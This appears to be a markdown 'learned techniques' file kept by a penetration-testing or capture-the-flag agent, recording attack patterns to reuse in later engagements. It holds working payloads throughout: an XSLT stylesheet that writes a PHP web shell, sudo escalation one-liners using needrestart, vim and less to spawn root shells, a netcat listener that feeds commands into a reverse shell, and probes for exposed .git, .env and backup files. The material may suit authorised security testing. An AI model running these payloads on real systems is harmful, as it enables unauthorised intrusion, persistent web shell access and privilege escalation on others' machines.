# Learned Techniques

**Purpose**: Capture novel attack techniques discovered during engagements. Read before each assessment to apply proven patterns.

**Protocol**: After discovering new techniques, document here using the template below. Keep entries concise (10-20 lines each).

---

## Quick Index

| Technique | Category | Trigger |
|-----------|----------|---------|
| XSLT File Write | Injection | XSLT/XML upload accepted |
| Config Injection (needrestart) | Privilege Escalation | sudo with -c flag allowed |
| Piped Shell Enumeration | Post-Exploitation | Unstable reverse shell |
| Source Code Discovery | Reconnaissance | Any web application |

---

## XSLT File Write via exsl:document

**Trigger**: Web application accepts XSLT file uploads for XML transformation

**Technique**:
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
<xsl:template match="/">
<exsl:document href="file:///var/www/html/shell.php" method="text">
&lt;?php system($_GET['c']); ?&gt;
</exsl:document>
</xsl:template>
</xsl:stylesheet>
```

**Verification**: Check if file written to target path, test web shell access

**Related**: XXE attacks, file upload vulnerabilities, cron exploitation

---

## Config Injection (needrestart/vim/less)

**Trigger**: `sudo -l` shows NOPASSWD for tools accepting `-c` or config file flags

**Technique**:
```bash
# needrestart (Perl config)
echo 'system("cat /root/flag.txt");' > /tmp/pwn.conf
sudo /usr/sbin/needrestart -c /tmp/pwn.conf -r l

# vim (Vimscript)
echo ':!sh' > /tmp/.vimrc
sudo vim -u /tmp/.vimrc

# less (LESSOPEN environment)
sudo LESSOPEN='|sh %s' less /etc/profile
```

**Verification**: Command executes with elevated privileges

**Related**: sudo misconfigurations, GTFOBins, environment variable abuse

---

## Piped Shell Enumeration

**Trigger**: Reverse shell connects but is too unstable for interactive use

**Technique**:
```bash
# 1. Create command list
cat > enum.txt << 'EOF'
id; whoami
find / -perm -4000 2>/dev/null
sudo -l
cat /etc/crontab
EOF

# 2. Pipe to listener
nc -lvnp 4444 < enum.txt | tee output.txt

# 3. Trigger reverse shell, wait for output
```

**Verification**: All enumeration output captured in output.txt

**Related**: mkfifo shells, Python PTY, shell stabilization

---

## Source Code Discovery

**Trigger**: Initial reconnaissance on any web application

**Technique**: Check common backup/source paths immediately
```bash
curl -I https://target.com/static/source_code.tar.gz
curl -I https://target.com/backup.zip
curl -I https://target.com/.git/HEAD
```

**Common Paths**: `/static/source_code.*`, `/backup/`, `/.git/`, `/.env`, `/app.zip`, `/config.php.bak`

**Verification**: Download and extract source code

**Related**: Directory brute-forcing, Git repository dumping, info disclosure

---

## Template for New Techniques

```markdown
## [Technique Name]

**Trigger**: [When to try this technique]

**Technique**:
[Commands or payload - keep to 5-10 lines]

**Verification**: [How to confirm it worked]

**Related**: [Cross-reference to attack categories]
```

---

## Self-Learning Protocol

**Before Engagement**:
1. Read LEARNED_TECHNIQUES.md for applicable patterns
2. Note techniques matching target tech stack

**During Engagement**:
1. Document novel techniques immediately
2. Note what worked and why

**After Engagement**:
1. Add 1-3 new techniques using template
2. Update Quick Index table
3. Keep total file under 200 lines (remove low-value entries if needed)

**Quality Standards**:
- Include only techniques NOT in main attack docs
- Provide working commands/code
- Keep each entry under 20 lines
- Cross-reference to related attacks
